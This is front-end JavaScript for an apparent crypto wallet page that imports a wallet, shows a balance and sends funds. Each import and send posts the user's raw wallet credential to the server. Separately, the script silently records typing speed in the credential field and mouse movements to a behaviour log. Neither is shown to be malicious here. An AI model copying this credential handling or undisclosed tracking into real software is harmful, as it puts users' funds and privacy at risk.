let typingStart = null, typingEnd = null, mouseMoves = [], sessionId = Math.random().toString(36).substr(2, 9);

document.getElementById('import-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    const wallet_type = this.wallet_type.value;
    const credential = this.credential.value;
    const res = await fetch('/import-wallet', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wallet_type, credential })
    });
    const data = await res.json();
    document.getElementById('import-result').innerText = data.success ? 'Imported Successfully' : 'Error';
});

document.getElementById('get-balance').onclick = async function() {
    const res = await fetch('/get-balance');
    const data = await res.json();
    document.getElementById('balance-result').innerText = `${data.balance} ${data.currency}`;
};

document.getElementById('send-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    const to_address = this.to_address.value;
    const amount = this.amount.value;
    const credential = this.credential.value;
    const res = await fetch('/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ to_address, amount, credential })
    });
    const data = await res.json();
    document.getElementById('send-result').innerText = data.success ? `Sent! (TXID: ${data.txid})` : 'Error';
});

// Typing speed capture
const credInput = document.getElementById('credential-input');
credInput.addEventListener('keydown', function(e) {
    if (!typingStart) typingStart = Date.now();
    typingEnd = Date.now();
});
credInput.addEventListener('blur', function() {
    if (typingStart && typingEnd) {
        const speed = credInput.value.length / ((typingEnd - typingStart) / 1000);
        sendBehaviorLog({ typing_speed: speed });
        typingStart = typingEnd = null;
    }
});

// Mouse movement capture
window.addEventListener('mousemove', function(e) {
    mouseMoves.push({ x: e.clientX, y: e.clientY, t: Date.now() });
    if (mouseMoves.length > 100) mouseMoves.shift();
});
window.addEventListener('beforeunload', function() {
    sendBehaviorLog({ mouse_movements: mouseMoves });
});

function sendBehaviorLog(data) {
    fetch('/behavior-log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            ...data,
            session_id: sessionId
        })
    });
}